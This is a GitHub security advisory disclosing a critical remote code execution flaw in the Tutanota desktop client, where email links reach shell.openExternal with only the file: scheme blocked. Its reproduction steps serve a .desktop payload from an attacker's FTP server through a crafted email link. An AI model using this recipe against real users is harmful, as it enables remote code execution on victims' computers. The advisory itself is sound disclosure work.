# Remote Code Execution via insufficiently sanitized call to shell.openExternal

Critical

[charlag](/charlag)
published
GHSA-mxgj-pq62-f644
Dec 15, 2023

## Package

npm

tutao/tutanota
([npm](/advisories?query=ecosystem%3Anpm))

## Affected versions

<=3.118.8

## Patched versions

3.118.12

## Description

### Summary

Tutanota allows users to open links in emails in external applications. It correctly blocks the `file:` URL scheme, which can be used by malicious actors to gain code execution on a victims computer, however fails to check other harmful schemes such as `ftp:`, `smb:`, etc. which can also be used.

### Details

* Observe that on [#L423 in src/desktop/ApplicationWindow.ts](https://github.com/tutao/tutanota/blob/master/src/desktop/ApplicationWindow.ts#L423), the `parsedUrl` parameter is passed into a `shell.openExternal` function call.
* Observe that on [#L417 in src/desktop/ApplicationWindow.ts](https://github.com/tutao/tutanota/blob/master/src/desktop/ApplicationWindow.ts#L417), only the `file:` scheme is blocked.
* An attacker can craft a malicious email, containing a hyperlink using schemes such as `ftp:`, `smb:`, `ms-msdt:`, `search-ms:`, etc. to gain RCE on a victims computer when clicked.

### Steps to Reproduce

**This PoC uses Ubuntu with the XFCE desktop environment, since it is least complicated to reproduce using this setup**

* Execute and authenticate to the Tutanota desktop version `3.118.8` AppImage on a Ubuntu Desktop with the XFCE environment.

* On another machine, host an FTP server with anonymous access enabled. Create and place a `pwn.desktop` file in the FTP root, with the following content:

```
[Desktop Entry]
Exec=xcalc
Type=Application

```

* Send an email to the email account logged in on tutanota containing a hyperlink pointing to the `pwn.desktop` file on the FTP server. Replace the corresponding values in the hyperlink: `ftp://username:password@ip-address/pwn.desktop`.

* On the tutanota desktop application, click on the hyperlink in the email received. Observe that the calculator application opens. You may need to confirm execution of the application in some cases.

### PoC

* Video PoC for the final stage of the exploit (victim clicks on link in email):

### Impact

Successful exploitation of this vulnerability will enable an attacker to gain code execution on a victims computer.

# CVSS v3 base metrics

Attack vector:
More severe the more the remote (logically and physically) an attacker can be in order to exploit the vulnerability.

Attack complexity:
More severe for the least complex attacks.

Privileges required:
More severe if no privileges are required.

User interaction:
More severe when no user interaction is required.

Scope:
More severe when a scope change occurs, e.g. one vulnerable component impacts resources in components beyond its security scope.

Confidentiality:
More severe when loss of data confidentiality is highest, measuring the level of data access available to an unauthorized user.

Integrity:
More severe when loss of data integrity is the highest, measuring the consequence of data modification possible by an unauthorized user.

Availability:
More severe when the loss of impacted component availability is highest.
